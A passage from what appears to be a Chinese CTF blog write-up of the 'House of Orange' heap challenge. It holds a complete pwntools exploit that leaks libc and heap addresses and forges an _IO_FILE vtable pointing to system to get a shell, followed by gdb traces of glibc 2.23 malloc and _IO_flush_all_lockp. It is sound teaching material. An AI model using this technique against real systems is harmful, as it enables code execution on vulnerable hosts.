class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Date    : 2018-12-29 14:03:27</span><br><span class="line"># @Author  : giantbranch (giantbranch@gmail.com)</span><br><span class="line"># @Link    : http://www.giantbranch.cn/</span><br><span class="line"># @tags : </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># struct house&#123;</span><br><span class="line">#     struct orange* point;</span><br><span class="line">#     qword*  name;</span><br><span class="line"># &#125;</span><br><span class="line"></span><br><span class="line"># struct orange&#123;</span><br><span class="line">#     dword   price</span><br><span class="line">#     dword   color;</span><br><span class="line"># &#125;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&quot;./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"> # 1. Red            </span><br><span class="line"> # 2. Green            </span><br><span class="line"> # 3. Yellow            </span><br><span class="line"> # 4. Blue            </span><br><span class="line"> # 5. Purple            </span><br><span class="line"> # 6. Cyan            </span><br><span class="line"> # 7. White </span><br><span class="line">def build(nameLen, name, price, color):</span><br><span class="line">    p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;Length of name :&quot;)</span><br><span class="line">    p.sendline(str(nameLen))</span><br><span class="line">    p.recvuntil(&quot;Name :&quot;)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(&quot;Price of Orange:&quot;)</span><br><span class="line">    p.sendline(str(price))</span><br><span class="line">    p.recvuntil(&quot;Color of Orange:&quot;)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">    p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def upgrade(nameLen, name, price, color):</span><br><span class="line">    p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;Length of name :&quot;)</span><br><span class="line">    p.sendline(str(nameLen))</span><br><span class="line">    p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(&quot;Price of Orange:&quot;)</span><br><span class="line">    p.sendline(str(price))</span><br><span class="line">    p.recvuntil(&quot;Color of Orange:&quot;)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line"></span><br><span class="line">def getpid():</span><br><span class="line">    print proc.pidof(p)[0]</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">main_arena_offset = 0x3c4b20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">######### overwrite top chunk size</span><br><span class="line">build(0x10, &quot;A&quot;*0x10, 10,  1)</span><br><span class="line">upgrade(0x40, &quot;A&quot;*0x10+ p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0) * 2 + p64(0xfa1), 10 , 1)</span><br><span class="line"># let top chunk to unsort bin list</span><br><span class="line">build(0xfb0, &quot;A&quot;*0x10, 10,  1)</span><br><span class="line"></span><br><span class="line">######### leak libc</span><br><span class="line"># in 64 bit, must malloc more than 0x3e9 to get large bin</span><br><span class="line">build(0x400, &quot;A&quot;*8, 10,  1)</span><br><span class="line"># build(0x3e9, &quot;A&quot;*8, 10,  1)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(&quot;Name of house : AAAAAAAA&quot;)</span><br><span class="line">largebin_leak = u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;largebin_leak = &quot; + hex(largebin_leak)</span><br><span class="line">main_arena = largebin_leak - 1640</span><br><span class="line">print &quot;main_arena = &quot; + hex(main_arena)</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print &quot;libc_base = &quot; + hex(libc_base)</span><br><span class="line">system = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">_IO_list_all = libc_base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">print &quot;system = &quot; + hex(system)</span><br><span class="line">print &quot;_IO_list_all = &quot; + hex(_IO_list_all)</span><br><span class="line"></span><br><span class="line"># getpid()</span><br><span class="line"># leak heap</span><br><span class="line">upgrade(0x20, &quot;A&quot;*0x10, 10 , 1)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(&quot;Name of house : AAAAAAAAAAAAAAAA&quot;)</span><br><span class="line">heap_addr = u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;heap_addr = &quot; + hex(heap_addr)</span><br><span class="line"></span><br><span class="line"># unsortbin attack to write _IO_list_all</span><br><span class="line">payload = &quot;A&quot; * 0x400 # padding</span><br><span class="line">payload += p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0)</span><br><span class="line"></span><br><span class="line"># fake_file:   fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">fake_file = &quot;/bin/sh\x00&quot; + p64(0x61) </span><br><span class="line">fake_file += p64(0xaabbccdd) + p64(_IO_list_all-0x10) #unsortbin attack</span><br><span class="line">fake_file += p64(0) + p64(1) #_IO_write_base &lt; _IO_write_ptr</span><br><span class="line">fake_file += p64(0) * 18</span><br><span class="line">fake_file += p64(0) # fp-&gt;_mode &lt;= 0</span><br><span class="line">fake_file += p64(0) * 2 # _unused2</span><br><span class="line">fake_file += p64(heap_addr + 0x510) # vtable_point (point to next)</span><br><span class="line"></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(0) * 3 # vtable</span><br><span class="line">payload += p64(system)  # __overflow &lt;-- system</span><br><span class="line"></span><br><span class="line">print hex(len(payload))</span><br><span class="line"># getpid()</span><br><span class="line"></span><br><span class="line">upgrade(0x6666, payload, 11, 2)</span><br><span class="line"></span><br><span class="line"># getshell</span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="附录——调试最后的流程劫持过程"><a href="#附录——调试最后的流程劫持过程" class="headerlink" title="附录——调试最后的流程劫持过程"></a>附录——调试最后的流程劫持过程</h1><p>首先下个硬件断点：<code>watch _IO_list_all</code></p>
<p>断下来，由于开启了源码调试，我们看源码吧，<code>bck-&gt;fd = unsorted_chunks (av);</code>就是将unsorted_bin的头指针写到<code>_IO_list_all</code>的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  3515           unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">  3516           bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">  3517 </span><br><span class="line">  3518           /* Take now instead of binning if exact fit */</span><br><span class="line">  3519 </span><br><span class="line">► 3520           if (size == nb)</span><br><span class="line">  3521             &#123;</span><br><span class="line">  3522               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">  3523               if (av != &amp;main_arena)</span><br><span class="line">  3524                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">  3525               check_malloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure>

<p>继续调试</p>
<p>下面的代码是不会进去的，因为这是刚好满足的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Take now instead of binning if exact fit */</span><br><span class="line"></span><br><span class="line">          if (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>接下来是进入这里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  3533           if (in_smallbin_range (size))</span><br><span class="line">  3534             &#123;</span><br><span class="line">► 3535               victim_index = smallbin_index (size);</span><br><span class="line">  3536               bck = bin_at (av, victim_index);</span><br><span class="line">  3537               fwd = bck-&gt;fd;</span><br><span class="line">  3538             &#125;</span><br></pre></td></tr></table></figure>

<p>接下来的操作是,将这个chunk放到对应的bin上，比如这里就放到0x60的bins上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>此时这个0x60大小的chunk已经放入smallbin了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ smallbin</span><br><span class="line">smallbins</span><br><span class="line">0x60: 0x55bc09c5a4f0 —▸ 0x7f32413d8bc8 (main_arena+168) ◂— 0x55bc09c5a4f0</span><br></pre></td></tr></table></figure>

<p>接下来就去下一个unsortbin的chunk了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3464    */</span><br><span class="line">  3465 </span><br><span class="line">  3466   for (;; )</span><br><span class="line">  3467     &#123;</span><br><span class="line">  3468       int iters = 0;</span><br><span class="line">► 3469       while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">  3470         &#123;</span><br><span class="line">  3471           bck = victim-&gt;bk;</span><br><span class="line">  3472           if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">  3473               || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">  3474             malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,</span><br></pre></td></tr></table></figure>

<p>接下来由于<code>_IO_list_all</code>那边的size为0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /20gx 0x7f32413d9510</span><br><span class="line">0x7f32413d9510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f32413d9520 &lt;_IO_list_all&gt;:	0x00007f32413d8b78	0x0000000000000000</span><br><span class="line">0x7f32413d9530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f32413d9540 &lt;_IO_2_1_stderr_&gt;:	0x00000000fbad2086	0x0000000000000000</span><br><span class="line">0x7f32413d9550 &lt;_IO_2_1_stderr_+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f32413d9560 &lt;_IO_2_1_stderr_+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f32413d9570 &lt;_IO_2_1_stderr_+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f32413d9580 &lt;_IO_2_1_stderr_+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f32413d9590 &lt;_IO_2_1_stderr_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f32413d95a0 &lt;_IO_2_1_stderr_+96&gt;:	0x0000000000000000	0x00007f32413d9620</span><br></pre></td></tr></table></figure>

<p>具体可以看看调试，rsi为0，就是size为0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x7f32413d8b20 (main_arena) ◂— 0x100000001</span><br><span class="line"> RCX  0x6</span><br><span class="line"> RDX  0x40</span><br><span class="line"> RDI  0x7f32413d8bc8 (main_arena+168) —▸ 0x7f32413d8bb8 (main_arena+152) —▸ 0x7f32413d8ba8 (main_arena+136) —▸ 0x7f32413d8b98 (main_arena+120) —▸ 0x7f32413d8b88 (main_arena+104) ◂— ...</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x7f32413d8bc8 (main_arena+168) —▸ 0x7f32413d8bb8 (main_arena+152) —▸ 0x7f32413d8ba8 (main_arena+136) —▸ 0x7f32413d8b98 (main_arena+120) —▸ 0x7f32413d8b88 (main_arena+104) ◂— ...</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x7f324118b5e0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]</span><br><span class="line"> R12  0x7f32413d8b78 (main_arena+88) —▸ 0x55bc09c7bfc0 ◂— 0x0</span><br><span class="line"> R13  0x7f32413d9510 ◂— 0x0</span><br><span class="line"> R14  0x270f</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x20</span><br><span class="line"> RSP  0x7ffe04d39120 ◂— 0x2</span><br><span class="line"> RIP  0x7f3241095ddc (_int_malloc+604) ◂— cmp    rsi, 0x10</span><br><span class="line">───────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x7f3241095dc7 &lt;_int_malloc+583&gt;    mov    r13, qword ptr [rbx + 0x70]</span><br><span class="line">   0x7f3241095dcb &lt;_int_malloc+587&gt;    cmp    r13, r12</span><br><span class="line">   0x7f3241095dce &lt;_int_malloc+590&gt;    je     _int_malloc+1511 &lt;0x7f3241096167&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f3241095dd4 &lt;_int_malloc+596&gt;    mov    rsi, qword ptr [r13 + 8]</span><br><span class="line">   0x7f3241095dd8 &lt;_int_malloc+600&gt;    mov    r15, qword ptr [r13 + 0x18]</span><br><span class="line"> ► 0x7f3241095ddc &lt;_int_malloc+604&gt;    cmp    rsi, 0x10</span><br><span class="line">   0x7f3241095de0 &lt;_int_malloc+608&gt;    jbe    _int_malloc+960 &lt;0x7f3241095f40&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f3241095f40 &lt;_int_malloc+960&gt;    mov    r10d, dword ptr [rip + 0x342209] &lt;0x7f32413d8150&gt;</span><br><span class="line">   0x7f3241095f47 &lt;_int_malloc+967&gt;    or     dword ptr [rbx + 4], 4</span><br><span class="line">   0x7f3241095f4b &lt;_int_malloc+971&gt;    mov    eax, r10d</span><br><span class="line">   0x7f3241095f4e &lt;_int_malloc+974&gt;    and    eax, 5</span><br><span class="line">────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/giantbranch/glibc-2.23/malloc/malloc.c</span><br><span class="line">   3467     &#123;</span><br><span class="line">   3468       int iters = 0;</span><br><span class="line">   3469       while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">   3470         &#123;</span><br><span class="line">   3471           bck = victim-&gt;bk;</span><br><span class="line"> ► 3472           if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">   3473               || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">   3474             malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,</span><br><span class="line">   3475                              chunk2mem (victim), av);</span><br><span class="line">   3476           size = chunksize (victim);</span><br><span class="line">   3477 </span><br><span class="line">────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffe04d39120 ◂— 0x2</span><br><span class="line">01:0008│      0x7ffe04d39128 ◂— 0x10</span><br><span class="line">02:0010│      0x7ffe04d39130 —▸ 0x7ffe04d391a0 ◂— 0xa /* &apos;\n&apos; */</span><br><span class="line">03:0018│      0x7ffe04d39138 —▸ 0x7ffe04d39340 ◂— 0x1</span><br><span class="line">04:0020│      0x7ffe04d39140 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">06:0030│      0x7ffe04d39150 ◂— 0xffff8001fb2c6e61</span><br><span class="line">07:0038│      0x7ffe04d39158 —▸ 0x7ffe04d3919f ◂— 0xa00</span><br><span class="line">──────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7f3241095ddc _int_malloc+604</span><br><span class="line">   f 1     7f3241098184 malloc+84</span><br><span class="line">   f 2     55bc08934d6d</span><br><span class="line">   f 3     55bc08935402</span><br><span class="line">   f 4     7f3241034830 __libc_start_main+240</span><br></pre></td></tr></table></figure>

<p>那么接下来就进入了malloc_printerr这个函数了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 3474             malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,</span><br><span class="line">  3475                              chunk2mem (victim), av);</span><br></pre></td></tr></table></figure>

<p>接下来直接运行，崩溃，可以看到调用顺序是<code>malloc_printerr----&gt;__libc_message----&gt;__GI_abort----&gt;_IO_flush_all_lockp</code></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ <span class="keyword">bt</span></span><br><span class="line">#<span class="number">0</span>  <span class="number">0x00007f32413d8c38</span> <span class="keyword">in</span> main_arena () from /lib/x86_64-linux-gnu/libc.so<span class="meta">.6</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007f3241090196</span> <span class="keyword">in</span> _IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>) <span class="meta">at</span> genops.c:<span class="number">786</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007f324104afbd</span> <span class="keyword">in</span> __GI_abort () <span class="meta">at</span> abort.c:<span class="number">74</span></span><br><span class="line">#<span class="number">3</span>  <span class="number">0x00007f324108b7ea</span> <span class="keyword">in</span> __libc_message (do_abort=<span class="number">0x2</span>, fmt=fmt@entry=<span class="number">0x7f32411a4ed8</span> <span class="string">"*** Error in `%"</span>...) <span class="meta">at</span> ../sysdeps/posix/libc_fatal.c:<span class="number">175</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00007f324109613e</span> <span class="keyword">in</span> malloc_printerr (ar_ptr=<span class="number">0x7f32413d8b20</span> &lt;main_arena&gt;, <span class="built_in">ptr</span>=<span class="number">0x7f32413d9520</span> &lt;_IO_list_all&gt;, <span class="keyword">str</span>=<span class="number">0x7f32411a1d3f</span> <span class="string">"malloc(): memor"</span>..., action=&lt;optimized <span class="keyword">out</span>&gt;) <span class="meta">at</span> malloc.c:<span class="number">5006</span></span><br><span class="line">#<span class="number">5</span>  _int_malloc (av=av@entry=<span class="number">0x7f32413d8b20</span> &lt;main_arena&gt;, bytes=bytes@entry=<span class="number">0x10</span>) <span class="meta">at</span> malloc.c:<span class="number">3474</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007f3241098184</span> <span class="keyword">in</span> __GI___libc_malloc (bytes=<span class="number">0x10</span>) <span class="meta">at</span> malloc.c:<span class="number">2913</span></span><br><span class="line">#<span class="number">7</span>  <span class="number">0x000055bc08934d6d</span> <span class="keyword">in</span> ?? ()</span><br><span class="line">#<span class="number">8</span>  <span class="number">0x000055bc08935402</span> <span class="keyword">in</span> ?? ()</span><br><span class="line">#<span class="number">9</span>  <span class="number">0x00007f3241034830</span> <span class="keyword">in</span> __libc_start_main (main=<span class="number">0x55bc089353af</span>, argc=<span class="number">0x1</span>, argv=<span class="number">0x7ffe04d39348</span>, init=&lt;optimized <span class="keyword">out</span>&gt;, fini=&lt;optimized <span class="keyword">out</span>&gt;, rtld_fini=&lt;optimized <span class="keyword">out</span>&gt;, stack_end=<span class="number">0x7ffe04d39338</span>) <span class="meta">at</span> ../csu/libc-start.c:<span class="number">291</span></span><br><span class="line">#<span class="number">10</span> <span class="number">0x000055bc08934b19</span> <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>所以经过上面的调试你理解4ngelboy的图了吧</p>
<h1 id="附录2：-IO-flush-all-lockp流程"><a href="#附录2：-IO-flush-all-lockp流程" class="headerlink" title="附录2：_IO_flush_all_lockp流程"></a>附录2：_IO_flush_all_lockp流程</h1><p>首先获取头指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  768     _IO_lock_lock (list_all_lock);</span><br><span class="line">  769 #endif</span><br><span class="line">  770 </span><br><span class="line">  771   last_stamp = _IO_list_all_stamp;</span><br><span class="line">  772   fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">► 773   while (fp != NULL)</span><br><span class="line">  774     &#123;</span><br><span class="line">  775       run_fp = fp;</span><br><span class="line">  776       if (do_lock)</span><br><span class="line">  777 	_IO_flockfile (fp);</span><br><span class="line">  778</span><br></pre></td></tr></table></figure>

<p>之后就到达判断处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 779       if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">  780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">  781 	   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">  782 	       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">  783 				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br></pre></td></tr></table></figure>

<p>由于第一个_IO_FILE_plus条件不满足直接跳过了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p *(struct _IO_FILE_plus *)0x7f6d94f61b78</span><br><span class="line">$19 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0x660a0fc0, </span><br><span class="line">    _IO_read_ptr = 0x55fc6607f4f0 &quot;/bin/sh&quot;, </span><br><span class="line">    _IO_read_end = 0x55fc6607f4f0 &quot;/bin/sh&quot;, </span><br><span class="line">    _IO_read_base = 0x7f6d94f62510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x7f6d94f61b88 &lt;main_arena+104&gt; &quot;\360\364\af\374U&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f6d94f61b88 &lt;main_arena+104&gt; &quot;\360\364\af\374U&quot;, </span><br><span class="line">    _IO_write_end = 0x7f6d94f61b98 &lt;main_arena+120&gt; &quot;\210\033\366\224m\177&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f6d94f61b98 &lt;main_arena+120&gt; &quot;\210\033\366\224m\177&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f6d94f61ba8 &lt;main_arena+136&gt; &quot;\230\033\366\224m\177&quot;, </span><br><span class="line">    _IO_save_base = 0x7f6d94f61ba8 &lt;main_arena+136&gt; &quot;\230\033\366\224m\177&quot;, </span><br><span class="line">    _IO_backup_base = 0x7f6d94f61bb8 &lt;main_arena+152&gt; &quot;\250\033\366\224m\177&quot;, </span><br><span class="line">    _IO_save_end = 0x7f6d94f61bb8 &lt;main_arena+152&gt; &quot;\250\033\366\224m\177&quot;, </span><br><span class="line">    _markers = 0x55fc6607f4f0, </span><br><span class="line">    _chain = 0x55fc6607f4f0, </span><br><span class="line">    _fileno = 0x94f61bd8, </span><br><span class="line">    _flags2 = 0x7f6d, </span><br><span class="line">    _old_offset = 0x7f6d94f61bd8, </span><br><span class="line">    _cur_column = 0x1be8, </span><br><span class="line">    _vtable_offset = 0xf6, </span><br><span class="line">    _shortbuf = &quot;\224&quot;, </span><br><span class="line">    _lock = 0x7f6d94f61be8 &lt;main_arena+200&gt;, </span><br><span class="line">    _offset = 0x7f6d94f61bf8, </span><br><span class="line">    _codecvt = 0x7f6d94f61bf8 &lt;main_arena+216&gt;, </span><br><span class="line">    _wide_data = 0x7f6d94f61c08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_list = 0x7f6d94f61c08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_buf = 0x7f6d94f61c18 &lt;main_arena+248&gt;, </span><br><span class="line">    __pad5 = 0x7f6d94f61c18, </span><br><span class="line">    _mode = 0x94f61c28, </span><br><span class="line">    _unused2 = &quot;m\177\000\000(\034\366\224m\177\000\000\070\034\366&quot;...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f6d94f61c38 &lt;main_arena+280&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后通过_chain获取下一个_IO_FILE_plus</p>
